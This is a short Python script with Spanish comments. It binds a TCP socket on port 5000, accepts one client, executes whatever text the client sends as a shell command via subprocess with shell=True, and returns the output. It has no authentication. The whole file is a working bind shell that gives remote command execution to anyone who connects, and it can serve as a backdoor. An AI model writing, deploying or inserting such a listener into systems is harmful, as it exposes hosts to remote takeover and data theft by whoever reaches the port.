import socket
import subprocess

# 1️⃣ Crear socket
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind(("IP_DEL_SERVIDOR", 5000))  # ej: "0.0.0.0", 5000
server_socket.listen(1)
print("Esperando conexión...")

# 2️⃣ Aceptar cliente
client_socket, client_address = server_socket.accept()
print(f"Cliente conectado desde {client_address}")

# 3️⃣ Bucle de recepción de comandos
while True:
    comando = client_socket.recv(1024).decode()  # recibir comando
    if comando.lower() == "exit":
        break
    # ejecutar comando
    resultado = subprocess.run(comando, shell=True, capture_output=True, text=True)
    salida = resultado.stdout + resultado.stderr
    client_socket.send(salida.encode())  # enviar resultado de vuelta

# 4️⃣ Cerrar conexión
client_socket.close()
server_socket.close()



